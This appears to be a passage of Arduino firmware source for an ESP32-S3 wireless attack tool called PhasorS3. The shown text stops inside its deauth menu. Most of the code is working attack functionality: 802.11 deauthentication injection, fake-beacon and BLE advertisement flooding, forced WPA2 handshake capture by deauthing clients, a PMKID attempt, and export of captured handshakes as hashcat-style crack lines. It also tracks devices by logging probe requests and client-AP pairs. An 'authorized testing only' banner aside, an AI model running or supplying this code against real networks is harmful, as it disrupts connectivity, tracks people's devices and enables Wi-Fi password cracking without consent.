#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <ArduinoJson.h>
#include <vector>
#include <string.h>
#include <stdlib.h>

// USB HID (optional TinyUSB)
#if defined(ARDUINO_USB_MODE) && (ARDUINO_USB_MODE == 1)
  #include <USBHIDKeyboard.h>
  USBHIDKeyboard Keyboard;
  #define HAS_USB_HID 1
#else
  #define HAS_USB_HID 0
  class KeyboardStub {
  public:
    void begin() {}
    void end() {}
    void print(const char*) {}
    void write(uint8_t) {}
    void press(uint8_t) {}
    void releaseAll() {}
  };
  static KeyboardStub Keyboard;
#endif

// Config
#define FW_VERSION "3.0.1-Pro"
#define MAX_SSID_LEN 32
#define MAX_BEACON_SSIDS 50
#define MAX_PROBE_CACHE 200
#define MAX_STATION_CACHE 200
#define MAX_HANDSHAKE_CACHE 128
#define BLE_SCAN_TIME 5
#define BLE_FLOOD_INTERVAL_MS 30
#define MONITOR_HOP_MS 300

// Types
struct wifi_client_t {
  uint8_t sta[6];
  uint8_t ap[6];
  int8_t rssi;
  uint8_t channel;
  uint32_t lastSeen;
};

struct probe_device_t {
  uint8_t sta[6];
  uint32_t firstSeen;
  uint32_t lastSeen;
  int8_t rssi;
  uint8_t channel;
  char ssid[MAX_SSID_LEN + 1];
};

struct eapol_handshake_t {
  uint8_t sta[6];
  uint8_t ap[6];
  uint8_t channel;
  int8_t rssi;
  bool m1, m2, m3, m4;
  uint8_t anonce[32];
  uint8_t snonce[32];
  uint8_t mic[16];
  bool complete;
};

struct pmkid_entry_t {
  uint8_t ap[6];
  uint8_t channel;
  int8_t rssi;
  uint8_t pmkid[16];
  bool captured;
};

struct beacon_entry_t {
  char ssid[MAX_SSID_LEN + 1];
  bool active;
};

// Globals
BLEScan* pBLEScan = nullptr;
BLEAdvertising* pBLEAdvertising = nullptr;

enum SystemMode {
  MODE_IDLE = 0,
  MODE_MONITOR,
  MODE_CONTINUOUS_SCAN,
  MODE_BEACON_FLOOD,
  MODE_BLE_FLOOD
};

SystemMode currentMode = MODE_IDLE;
uint8_t currentChannel = 1;
uint32_t lastHop = 0;
uint32_t lastBeaconTx = 0;
int beaconTxIndex = 0;
int beaconCount = 0;
volatile bool attackRunning = false;
uint32_t attackStartTime = 0;
int bleFloodQuota = 0;

std::vector<eapol_handshake_t> handshakes;
std::vector<pmkid_entry_t> pmkidCaptures;
std::vector<wifi_client_t> stationCache;
std::vector<probe_device_t> probeCache;
beacon_entry_t beaconList[MAX_BEACON_SSIDS];

#define KEY_INFO_ACK (1 << 7)
#define KEY_INFO_MIC (1 << 8)
#define KEY_INFO_INSTALL (1 << 6)
#define KEY_INFO_PAIRWISE (1 << 3)

// Forward decls
void printBanner();
void printMenu();
void cmdHandler(const String& cmd);
void handleMonitorMode();
void handleContinuousMode();
void handleBeaconFlood();
void handleBLEFlood();

// Utils
static bool parseMac(const char* s, uint8_t* out) {
  unsigned int b[6];
  if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
             &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6 &&
      sscanf(s, "%02X:%02X:%02X:%02X:%02X:%02X",
             &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]) != 6) {
    return false;
  }
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
  return true;
}

// Animated PhasorS3 banner
void printBanner() {
  Serial.print("\x1B[2J\x1B[H");
  Serial.print("\x1B[36m");

  const char* lines[] = {
    "",
    "  ██████   ██   ██   █████   ███████   ██████   ██████     ███████  ██████         ",
    "  ██   ██  ██   ██  ██   ██  ██       ██    ██  ██    ██   ██             ██       ",
    "  ██████   ███████  ███████  ███████  ██    ██  ██████     ███████    ████         ",
    "  ██       ██   ██  ██   ██       ██  ██    ██  ██   ██         ██        ██        ",
    "  ██       ██   ██  ██   ██  ███████   ██████   ██   ██    ███████  ██████       ",
    "",
    "                           >>>  P H A S O R   S 3  <<<",
    "                      Professional Wireless Audit Platform",
    "                             Firmware  " FW_VERSION,
    "                ESP32-S3  |  2.4GHz Wi-Fi  |  BLE 5  |  USB-HID",
    ""
  };

  const int n = sizeof(lines) / sizeof(lines[0]);
  for (int i = 0; i < n; i++) {
    const char* p = lines[i];
    while (*p) {
      Serial.print(*p++);
      delay(3);
    }
    Serial.println();
    delay(45);
  }

  Serial.print("  [");
  for (int i = 0; i < 40; i++) {
    Serial.print("=");
    delay(18);
  }
  Serial.println("] ONLINE");
  Serial.print("\x1B[0m");
  Serial.println();
  Serial.println("  [*] Authorized testing only. Targets in declared scope.");
  Serial.printf("  [*] Heap free: %u | PSRAM free: %u\n\n",
                ESP.getFreeHeap(), ESP.getFreePsram());
}

// EAPOL
static bool isEapolFrame(const uint8_t* buf, int len) {
  if (len < 40) return false;
  for (int i = 24; i < len - 2; i++) {
    if (buf[i] == 0x88 && buf[i + 1] == 0x8E) return true;
  }
  return false;
}

static void parseEapolKey(const uint8_t* p, int len, eapol_handshake_t* hs) {
  if (len < 99) return;
  if (p[1] != 0x03) return; // EAPOL-Key
  if (p[4] != 0x02) return; // RSN key descriptor

  uint16_t ki = ((uint16_t)p[5] << 8) | p[6];
  const uint8_t* nonce = &p[17];
  const uint8_t* kmic = &p[81];

  bool ack = (ki & KEY_INFO_ACK) != 0;
  bool mic = (ki & KEY_INFO_MIC) != 0;
  bool install = (ki & KEY_INFO_INSTALL) != 0;
  bool pairwise = (ki & KEY_INFO_PAIRWISE) != 0;

  if (pairwise && ack && !mic) {
    hs->m1 = true;
    memcpy(hs->anonce, nonce, 32);
  } else if (pairwise && mic && !ack && !install) {
    bool nonceZero = true;
    for (int i = 0; i < 32; i++) if (nonce[i]) { nonceZero = false; break; }
    if (!nonceZero) {
      hs->m2 = true;
      memcpy(hs->snonce, nonce, 32);
      memcpy(hs->mic, kmic, 16);
    } else {
      hs->m4 = true;
    }
  } else if (pairwise && mic && ack && install) {
    hs->m3 = true;
    memcpy(hs->anonce, nonce, 32);
    memcpy(hs->mic, kmic, 16);
  }

  hs->complete = (hs->m1 && hs->m2 && hs->m3) || (hs->m2 && hs->m3);
}

// 802.11 TX
static void txFrame(const uint8_t* frame, size_t len, uint8_t ch) {
  if (ch >= 1 && ch <= 13) {
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  }
  delay(1);
  if (esp_wifi_80211_tx(WIFI_IF_AP, (void*)frame, (int)len, true) != ESP_OK) {
    esp_wifi_80211_tx(WIFI_IF_STA, (void*)frame, (int)len, true);
  }
}

void deauthInject(const uint8_t* ap, const uint8_t* sta, uint8_t ch, uint8_t reason) {
  uint8_t f[26];
  memset(f, 0, sizeof(f));
  f[0] = 0xC0; // Deauth
  f[1] = 0x00;
  memcpy(&f[4], sta, 6);
  memcpy(&f[10], ap, 6);
  memcpy(&f[16], ap, 6);
  f[24] = reason;
  f[25] = 0x00;
  txFrame(f, sizeof(f), ch);

  // reverse direction
  memcpy(&f[4], ap, 6);
  memcpy(&f[10], sta, 6);
  memcpy(&f[16], ap, 6);
  txFrame(f, sizeof(f), ch);
}

void deauthBroadcast(const uint8_t* ap, uint8_t ch, int count) {
  uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  for (int i = 0; i < count; i++) {
    deauthInject(ap, bcast, ch, 0x07);
    delay(20);
  }
  Serial.printf("[DEAUTH] Broadcast x%d on CH %u\n", count, ch);
}

void deauthTargeted(const uint8_t* ap, const uint8_t* sta, uint8_t ch, int count) {
  for (int i = 0; i < count; i++) {
    deauthInject(ap, sta, ch, 0x07);
    delay(20);
  }
  Serial.printf("[DEAUTH] Targeted x%d on CH %u\n", count, ch);
}

void beaconInject(const char* ssid, uint8_t ch, const uint8_t* customMac) {
  int ssidLen = (int)strlen(ssid);
  if (ssidLen > 31) ssidLen = 31;

  uint8_t frame[256];
  int idx = 0;

  frame[idx++] = 0x80; frame[idx++] = 0x00;
  frame[idx++] = 0x00; frame[idx++] = 0x00;

  for (int i = 0; i < 6; i++) frame[idx++] = 0xFF; // DA broadcast

  uint8_t sa[6];
  if (customMac) memcpy(sa, customMac, 6);
  else {
    esp_fill_random(sa, 6);
    sa[0] = (sa[0] & 0xFE) | 0x02; // local admin unicast
  }
  for (int i = 0; i < 6; i++) frame[idx++] = sa[i];
  for (int i = 0; i < 6; i++) frame[idx++] = sa[i]; // BSSID

  uint16_t seq = (uint16_t)random(0, 4096);
  frame[idx++] = seq & 0xFF;
  frame[idx++] = (seq >> 8) & 0xFF;

  uint64_t ts = (uint64_t)millis() * 1000ULL;
  for (int i = 0; i < 8; i++) { frame[idx++] = (uint8_t)(ts & 0xFF); ts >>= 8; }
  frame[idx++] = 0x64; frame[idx++] = 0x00; // beacon interval
  frame[idx++] = 0x01; frame[idx++] = 0x04; // capabilities

  frame[idx++] = 0x00; frame[idx++] = (uint8_t)ssidLen;
  for (int i = 0; i < ssidLen; i++) frame[idx++] = (uint8_t)ssid[i];

  frame[idx++] = 0x01; frame[idx++] = 0x08;
  frame[idx++] = 0x82; frame[idx++] = 0x84; frame[idx++] = 0x8B; frame[idx++] = 0x96;
  frame[idx++] = 0x0C; frame[idx++] = 0x12; frame[idx++] = 0x18; frame[idx++] = 0x24;

  frame[idx++] = 0x03; frame[idx++] = 0x01; frame[idx++] = ch;

  txFrame(frame, (size_t)idx, ch);
}

// Promiscuous callback
void promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* pl = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  int8_t rssi = pkt->rx_ctrl.rssi;
  uint8_t ch = pkt->rx_ctrl.channel;
  if (len < 24) return;

  uint8_t ftype = pl[0] & 0x0C;
  uint8_t stype = pl[0] & 0xF0;

  // Probe Request
  if (ftype == 0x00 && stype == 0x40) {
    Serial.printf("[PROBE] %02X:%02X:%02X:%02X:%02X:%02X | CH %02u | RSSI %d\n",
                  pl[10], pl[11], pl[12], pl[13], pl[14], pl[15], ch, rssi);

    probe_device_t pd;
    memset(&pd, 0, sizeof(pd));
    memcpy(pd.sta, &pl[10], 6);
    pd.firstSeen = pd.lastSeen = millis();
    pd.rssi = rssi;
    pd.channel = ch;

    for (int off = 24; off + 2 < len; ) {
      uint8_t tag = pl[off];
      uint8_t tlen = pl[off + 1];
      if (off + 2 + tlen > len) break;
      if (tag == 0x00) {
        int n = tlen > MAX_SSID_LEN ? MAX_SSID_LEN : tlen;
        memcpy(pd.ssid, &pl[off + 2], n);
        pd.ssid[n] = 0;
        break;
      }
      off += 2 + tlen;
    }

    bool found = false;
    for (auto& p : probeCache) {
      if (memcmp(p.sta, pd.sta, 6) == 0) {
        p.lastSeen = millis();
        p.rssi = rssi;
        if (pd.ssid[0]) strncpy(p.ssid, pd.ssid, MAX_SSID_LEN);
        found = true;
        break;
      }
    }
    if (!found && (int)probeCache.size() < MAX_PROBE_CACHE) probeCache.push_back(pd);
    return;
  }

  // Deauth
  if (ftype == 0x00 && stype == 0xC0 && len >= 26) {
    uint16_t reason = pl[24] | ((uint16_t)pl[25] << 8);
    Serial.printf("[DEAUTH-RX] AP %02X:%02X:%02X:%02X:%02X:%02X -> STA %02X:%02X:%02X:%02X:%02X:%02X | R=%u CH=%u\n",
                  pl[10], pl[11], pl[12], pl[13], pl[14], pl[15],
                  pl[4], pl[5], pl[6], pl[7], pl[8], pl[9],
                  reason, ch);
    return;
  }

  // Auth / Assoc
  if (ftype == 0x00 && stype == 0xB0) {
    Serial.printf("[AUTH] STA %02X:%02X:%02X:%02X:%02X:%02X CH %u RSSI %d\n",
                  pl[10], pl[11], pl[12], pl[13], pl[14], pl[15], ch, rssi);
    return;
  }
  if (ftype == 0x00 && stype == 0x00) {
    Serial.printf("[ASSOC] STA %02X:%02X:%02X:%02X:%02X:%02X CH %u\n",
                  pl[10], pl[11], pl[12], pl[13], pl[14], pl[15], ch);
    return;
  }

  // Data + EAPOL
  if (ftype != 0x08 || len <= 40) return;

  uint8_t toDS = pl[1] & 0x01;
  uint8_t frDS = pl[1] & 0x02;
  uint8_t* a1 = &pl[4];
  uint8_t* a2 = &pl[10];
  uint8_t* a3 = &pl[16];

  uint8_t* staMac = nullptr;
  uint8_t* apMac = nullptr;
  if (toDS && !frDS) { staMac = a2; apMac = a3; }
  else if (!toDS && frDS) { staMac = a1; apMac = a3; }
  else if (!toDS && !frDS) { staMac = a2; apMac = a3; }
  else return;

  if (staMac[0] & 0x01) return; // multicast STA skip

  bool found = false;
  for (auto& s : stationCache) {
    if (memcmp(s.sta, staMac, 6) == 0 && memcmp(s.ap, apMac, 6) == 0) {
      s.rssi = rssi;
      s.lastSeen = millis();
      s.channel = ch;
      found = true;
      break;
    }
  }
  if (!found && (int)stationCache.size() < MAX_STATION_CACHE) {
    wifi_client_t sc;
    memcpy(sc.sta, staMac, 6);
    memcpy(sc.ap, apMac, 6);
    sc.rssi = rssi;
    sc.channel = ch;
    sc.lastSeen = millis();
    stationCache.push_back(sc);
    Serial.printf("[NETMAP] %02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X CH%u\n",
                  staMac[0], staMac[1], staMac[2], staMac[3], staMac[4], staMac[5],
                  apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5], ch);
  }

  if (!isEapolFrame(pl, len)) return;

  for (int off = 24; off < len - 3; off++) {
    if (pl[off] == 0x88 && pl[off + 1] == 0x8E) {
      int eapolStart = off + 2;
      eapol_handshake_t* hs = nullptr;
      for (auto& h : handshakes) {
        if (memcmp(h.sta, staMac, 6) == 0 && memcmp(h.ap, apMac, 6) == 0) {
          hs = &h;
          break;
        }
      }
      if (!hs && (int)handshakes.size() < MAX_HANDSHAKE_CACHE) {
        eapol_handshake_t h;
        memset(&h, 0, sizeof(h));
        memcpy(h.sta, staMac, 6);
        memcpy(h.ap, apMac, 6);
        h.channel = ch;
        h.rssi = rssi;
        handshakes.push_back(h);
        hs = &handshakes.back();
      }
      if (hs && !hs->complete) {
        parseEapolKey(&pl[eapolStart], len - eapolStart, hs);
        int msg = hs->m4 ? 4 : (hs->m3 ? 3 : (hs->m2 ? 2 : (hs->m1 ? 1 : 0)));
        Serial.printf("[EAPOL] M%d STA %02X:%02X:%02X:%02X:%02X:%02X AP %02X:%02X:%02X:%02X:%02X:%02X %s\n",
                      msg,
                      staMac[0], staMac[1], staMac[2], staMac[3], staMac[4], staMac[5],
                      apMac[0], apMac[1], apMac[2], apMac[3], apMac[4], apMac[5],
                      hs->complete ? "COMPLETE" : "");
      }
      break;
    }
  }
}

// BLE
class ScanCallback : public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice) override {}
};

void restoreBleScan() {
  BLEDevice::deinit(false);
  delay(150);
  BLEDevice::init("Phasor-S3");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new ScanCallback());
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  pBLEAdvertising = nullptr;
}

void bleFloodStart(const uint8_t* targetMac, int count) {
  Serial.printf("[BLE-FLOOD] %02X:%02X:%02X:%02X:%02X:%02X x%d\n",
                targetMac[0], targetMac[1], targetMac[2],
                targetMac[3], targetMac[4], targetMac[5], count);

  if (pBLEScan) pBLEScan->stop();
  BLEDevice::deinit(false);
  delay(150);
  BLEDevice::init("Phasor-S3");
  pBLEAdvertising = BLEDevice::getAdvertising();
  if (!pBLEAdvertising) {
    Serial.println("[-] BLE advertising failed");
    restoreBleScan();
    return;
  }

  uint8_t raw[31];
  memset(raw, 0, sizeof(raw));
  raw[0] = 0x02; raw[1] = 0x01; raw[2] = 0x06;
  raw[3] = 0x1B; raw[4] = 0xFF;
  raw[5] = 0x4C; raw[6] = 0x00; // Apple company ID style noise
  for (int i = 0; i < 6; i++) raw[7 + i] = targetMac[i];
  for (int i = 13; i < 31; i++) raw[i] = (uint8_t)random(0, 256);

  BLEAdvertisementData advData;
  advData.addData(std::string((char*)raw, 31));
  pBLEAdvertising->setAdvertisementData(advData);
  pBLEAdvertising->setAdvertisementType(ADV_TYPE_IND);
  pBLEAdvertising->setMinInterval(0x20);
  pBLEAdvertising->setMaxInterval(0x30);
  pBLEAdvertising->start();

  attackRunning = true;
  attackStartTime = millis();
  bleFloodQuota = count;
  currentMode = MODE_BLE_FLOOD;
  Serial.println("[BLE-FLOOD] running — send FS to stop");
}

void bleMassFlood(int burstsPerDevice) {
  if (!pBLEScan) {
    Serial.println("[-] BLE not ready");
    return;
  }
  Serial.println("[BLE-MASS] scanning...");
  pBLEScan->setActiveScan(true);
  BLEScanResults res = pBLEScan->start(3, false);
  int n = res.getCount();
  if (n <= 0) {
    Serial.println("[-] no BLE devices");
    return;
  }
  Serial.printf("[BLE-MASS] %d devices\n", n);

  // Snapshot MACs first (scan buffer invalid after re-init)
  uint8_t macs[32][6];
  int mc = 0;
  for (int i = 0; i < n && mc < 32; i++) {
    BLEAdvertisedDevice d = res.getDevice(i);
    if (parseMac(d.getAddress().toString().c_str(), macs[mc])) mc++;
  }
  pBLEScan->clearResults();

  for (int i = 0; i < mc; i++) {
    bleFloodStart(macs[i], burstsPerDevice > 0 ? burstsPerDevice : 40);
    delay(1500);
    attackRunning = false;
    if (pBLEAdvertising) pBLEAdvertising->stop();
    restoreBleScan();
  }
  currentMode = MODE_IDLE;
  Serial.println("[BLE-MASS] done");
}

bool pmkidCapture(const uint8_t* apMac, const char* ssid, uint8_t ch) {
  Serial.printf("[PMKID] try SSID='%s' CH=%u\n", ssid, ch);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(80);
  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  wifi_config_t conf;
  memset(&conf, 0, sizeof(conf));
  conf.sta.channel = ch;
  conf.sta.bssid_set = 1;
  memcpy(conf.sta.bssid, apMac, 6);
  strncpy((char*)conf.sta.ssid, ssid, 31);
  conf.sta.ssid[31] = 0;
  strncpy((char*)conf.sta.password, "WrongPass_ForPMKID!", 63);
  conf.sta.password[63] = 0;
  conf.sta.scan_method = WIFI_FAST_SCAN;
  conf.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
  conf.sta.threshold.rssi = -127;
  conf.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;

  esp_wifi_set_config(WIFI_IF_STA, &conf);
  esp_wifi_set_promiscuous(true);
  esp_wifi_connect();

  uint32_t t0 = millis();
  while (millis() - t0 < 3500) {
    delay(10);
    if (Serial.available() && Serial.read() == 'X') break;
  }

  esp_wifi_disconnect();
  // leave promisc if monitor was intended by user elsewhere

  Serial.println("[PMKID] stock core often misses raw PMKID; starting DF-style force HS for 12s");
  deauthBroadcast(apMac, ch, 15);
  return false;
}

bool forceHandshake(const uint8_t* apMac, uint8_t ch, int timeoutSec) {
  int before = (int)handshakes.size();
  int completeBefore = 0;
  for (auto& h : handshakes) if (h.complete) completeBefore++;

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  currentMode = MODE_MONITOR;
  currentChannel = ch;

  Serial.printf("[FORCE-HS] CH %u for %ds (send X to abort)\n", ch, timeoutSec);
  uint32_t end = millis() + (uint32_t)timeoutSec * 1000UL;
  while (millis() < end) {
    deauthBroadcast(apMac, ch, 3);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    delay(120);
    int completeNow = 0;
    for (auto& h : handshakes) if (h.complete) completeNow++;
    if (completeNow > completeBefore) {
      Serial.println("[FORCE-HS] complete handshake captured");
      return true;
    }
    if (Serial.available()) {
      char c = (char)Serial.read();
      if (c == 'X' || c == 'x') break;
    }
  }
  Serial.printf("[FORCE-HS] done. HS entries %d -> %d\n", before, (int)handshakes.size());
  return false;
}

// Scans
static const char* authName(wifi_auth_mode_t a) {
  switch (a) {
    case WIFI_AUTH_OPEN: return "OPEN";
    case WIFI_AUTH_WEP: return "WEP";
    case WIFI_AUTH_WPA_PSK: return "WPA";
    case WIFI_AUTH_WPA2_PSK: return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-ENT";
    case WIFI_AUTH_WPA3_PSK: return "WPA3";
    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
    default: return "UNK";
  }
}

void scanWiFi(JsonDocument* doc) {
  if (currentMode == MODE_MONITOR) {
    esp_wifi_set_promiscuous(false);
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(true, true);
  delay(80);

  int n = WiFi.scanNetworks(false, true);
  Serial.println();
  Serial.println("  ===== 2.4 GHz Wi-Fi =====");
  Serial.printf("%-28s | %-17s | %4s | %3s | %s\n", "SSID", "BSSID", "RSSI", "CH", "AUTH");
  Serial.println("-----------------------------+-------------------+------+-----+----------");

  if (doc) {
    (*doc)["type"] = "wifi_scan";
    (*doc)["wifi"].to<JsonArray>();
  }

  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() == 0) ssid = "<Hidden>";
    const char* auth = authName(WiFi.encryptionType(i));
    Serial.printf("%-28.28s | %-17s | %4d | %3d | %s\n",
                  ssid.c_str(), WiFi.BSSIDstr(i).c_str(),
                  WiFi.RSSI(i), WiFi.channel(i), auth);
    if (doc) {
      JsonArray arr = (*doc)["wifi"].as<JsonArray>();
      JsonObject o = arr.add<JsonObject>();
      o["ssid"] = ssid;
      o["bssid"] = WiFi.BSSIDstr(i);
      o["rssi"] = WiFi.RSSI(i);
      o["channel"] = WiFi.channel(i);
      o["auth"] = auth;
    }
  }
  Serial.printf("[*] %d networks\n", n);
  WiFi.scanDelete();

  if (currentMode == MODE_MONITOR) {
    esp_wifi_set_promiscuous(true);
  }
}

void scanBLE(JsonDocument* doc) {
  if (!pBLEScan) {
    Serial.println("[-] BLE not ready");
    return;
  }
  pBLEScan->setActiveScan(true);
  BLEScanResults res = pBLEScan->start(BLE_SCAN_TIME, false);
  int n = res.getCount();

  Serial.println();
  Serial.println("  ===== BLE Devices =====");
  Serial.printf("%-24s | %-17s | %4s\n", "NAME", "MAC", "RSSI");
  Serial.println("-------------------------+-------------------+-----");

  if (doc) {
    (*doc)["type"] = "ble_scan";
    (*doc)["ble"].to<JsonArray>();
  }

  for (int i = 0; i < n; i++) {
    BLEAdvertisedDevice d = res.getDevice(i);
    String mac = String(d.getAddress().toString().c_str());
    mac.toUpperCase();
    String name = d.haveName() ? String(d.getName().c_str()) : String("<Unknown>");
    Serial.printf("%-24.24s | %-17s | %4d\n", name.c_str(), mac.c_str(), d.getRSSI());
    if (doc) {
      JsonArray arr = (*doc)["ble"].as<JsonArray>();
      JsonObject o = arr.add<JsonObject>();
      o["name"] = name;
      o["mac"] = mac;
      o["rssi"] = d.getRSSI();
    }
  }
  Serial.printf("[*] %d BLE devices\n", n);
  pBLEScan->clearResults();
}

void scanFull() {
  JsonDocument doc;
  doc["type"] = "full_scan";
  doc["timestamp"] = millis();
  scanWiFi(&doc);
  scanBLE(&doc);
}

void scanPassiveBLE() {
  if (!pBLEScan) return;
  pBLEScan->setActiveScan(false);
  BLEScanResults res = pBLEScan->start(BLE_SCAN_TIME, false);
  int n = res.getCount();
  Serial.println();
  Serial.println("  ===== Passive BLE RAW =====");
  for (int i = 0; i < n; i++) {
    BLEAdvertisedDevice d = res.getDevice(i);
    String mac = String(d.getAddress().toString().c_str());
    mac.toUpperCase();
    uint8_t* pl = d.getPayload();
    size_t plen = d.getPayloadLength();
    Serial.printf("%s | %d | ", mac.c_str(), d.getRSSI());
    for (size_t j = 0; j < plen; j++) Serial.printf("%02X", pl[j]);
    Serial.println();
  }
  pBLEScan->clearResults();
  pBLEScan->setActiveScan(true);
}

void showStatus() {
  int complete = 0;
  for (auto& h : handshakes) if (h.complete) complete++;
  Serial.println();
  Serial.println("  ===== PhasorS3 STATUS =====");
  Serial.printf("  Mode:        %d\n", (int)currentMode);
  Serial.printf("  Uptime:      %lu s\n", millis() / 1000UL);
  Serial.printf("  Handshakes:  %d (%d complete)\n", (int)handshakes.size(), complete);
  Serial.printf("  Stations:    %d\n", (int)stationCache.size());
  Serial.printf("  Probes:      %d\n", (int)probeCache.size());
  Serial.printf("  Beacons:     %d\n", beaconCount);
  Serial.printf("  Heap:        %u\n", ESP.getFreeHeap());
  Serial.printf("  PSRAM:       %u\n", ESP.getFreePsram());
}

void printMenu() {
  Serial.println();
  Serial.println("  +==================================================+");
  Serial.println("  |              PHASOR S3 " FW_VERSION "               |");
  Serial.println("  +----------------+------------------+--------------+");
  Serial.println("  | RECON          | ATTACK           | UTILS        |");
  Serial.println("  | 1 Wi-Fi Scan   | D Deauth Menu    | 7 Status     |");
  Serial.println("  | 2 BLE Scan     | B Beacon Flood   | 8 Stations   |");
  Serial.println("  | 3 Full Sweep   | F BLE Flood      | 9 Probes     |");
  Serial.println("  | 4 Continuous   | P PMKID Attempt  | E Export     |");
  Serial.println("  | 5 Monitor Hop  | K USB-HID Ducky  | C Clear      |");
  Serial.println("  | 6 Passive BLE  |                  |              |");
  Serial.println("  +----------------+------------------+--------------+");
  Serial.print("  >> ");
}

// Command handler
void cmdHandler(const String& cmdIn) {
  String cmd = cmdIn;
  cmd.trim();
  if (!cmd.length()) return;
  char c = cmd.charAt(0);

  switch (c) {
    case '1': {
      JsonDocument d;
      scanWiFi(&d);
      break;
    }
    case '2': {
      JsonDocument d;
      scanBLE(&d);
      break;
    }
    case '3':
      scanFull();
      break;

    case '4':
      if (currentMode == MODE_CONTINUOUS_SCAN) {
        currentMode = MODE_IDLE;
        Serial.println("[*] Continuous OFF");
      } else {
        currentMode = MODE_CONTINUOUS_SCAN;
        Serial.println("[*] Continuous ON (send 4 to stop)");
      }
      break;

    case '5':
      if (currentMode == MODE_MONITOR) {
        currentMode = MODE_IDLE;
        esp_wifi_set_promiscuous(false);
        Serial.println("[*] Monitor OFF");
      } else {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect(true, true);
        delay(50);
        currentMode = MODE_MONITOR;
        currentChannel = 1;
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        esp_wifi_set_promiscuous_rx_cb(&promiscuousCb);
        esp_wifi_set_promiscuous(true);
        Serial.println("[*] Monitor ON — channel hop (send 5 to stop)");
      }
      break;

    case '6':
      scanPassiveBLE();
      break;

    case '7':
      showStatus();
      break;

    case '8': {
      Serial.println();
      Serial.println("  ===== Stations (60s) =====");
      uint32_t now = millis();
      for (auto& s : stationCache) {
        if (now - s.lastSeen > 60000UL) continue;
        Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X -> %02X:%02X:%02X:%02X:%02X:%02X CH%u RSSI%d\n",
                      s.sta[0], s.sta[1], s.sta[2], s.sta[3], s.sta[4], s.sta[5],
                      s.ap[0], s.ap[1], s.ap[2], s.ap[3], s.ap[4], s.ap[5],
                      s.channel, s.rssi);
      }
      break;
    }

    case '9': {
      Serial.println();
      Serial.println("  ===== Probe cache =====");
      for (auto& p : probeCache) {
        Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X | %-20s | CH%u | %d\n",
                      p.sta[0], p.sta[1], p.sta[2], p.sta[3], p.sta[4], p.sta[5],
                      p.ssid[0] ? p.ssid : "(broadcast)", p.channel, p.rssi);
      }
      break;
    }

    case 'H':
    case 'h': {
      Serial.println();
      Serial.println("  ===== Handshakes =====");
      if (handshakes.empty()) Serial.println("  (none)");
      for (size_t i = 0; i < handshakes.size(); i++) {
        auto& hs = handshakes[i];
        Serial.printf("[%u] STA %02X:%02X:%02X:%02X:%02X:%02X AP %02X:%02X:%02X:%02X:%02X:%02X CH%u M1%d M2%d M3%d M4%d %s\n",
                      (unsigned)i,
                      hs.sta[0], hs.sta[1], hs.sta[2], hs.sta[3], hs.sta[4], hs.sta[5],
                      hs.ap[0], hs.ap[1], hs.ap[2], hs.ap[3], hs.ap[4], hs.ap[5],
                      hs.channel, hs.m1, hs.m2, hs.m3, hs.m4,
                      hs.complete ? "COMPLETE" : "partial");
      }
      break;
    }

    case 'E':
    case 'e': {
      Serial.println();
      Serial.println("  ===== Export (simplified hashcat-like lines) =====");
      for (auto& hs : handshakes) {
        if (!hs.complete) continue;
        char apS[18], staS[18], an[65], sn[65], mi[33];
        sprintf(apS, "%02X:%02X:%02X:%02X:%02X:%02X",
                hs.ap[0], hs.ap[1], hs.ap[2], hs.ap[3], hs.ap[4], hs.ap[5]);
        sprintf(staS, "%02X:%02X:%02X:%02X:%02X:%02X",
                hs.sta[0], hs.sta[1], hs.sta[2], hs.sta[3], hs.sta[4], hs.sta[5]);
        for (int j = 0; j < 32; j++) {
          sprintf(&an[j * 2], "%02X", hs.anonce[j]);
          sprintf(&sn[j * 2], "%02X", hs.snonce[j]);
        }
        for (int j = 0; j < 16; j++) sprintf(&mi[j * 2], "%02X", hs.mic[j]);
        an[64] = sn[64] = mi[32] = 0;
        Serial.printf("WPA*01*%s*%s*%s*%s*%s*\n", apS, staS, an, sn, mi);
      }
      break;
    }

    case 'C':
    case 'c':
      handshakes.clear();
      pmkidCaptures.clear();
      stationCache.clear();
      probeCache.clear();
      Serial.println("[*] buffers cleared");
      break;

    case 'D':
    case 'd': {
      Serial.println();
      Serial.println("  DEAUTH:");
      Serial.println("   DA <BSSID> <CH>");
      Serial.println("   DS <AP> <STA> <CH>");
      Serial.println("   DB <BSSID> <CH> <N>");
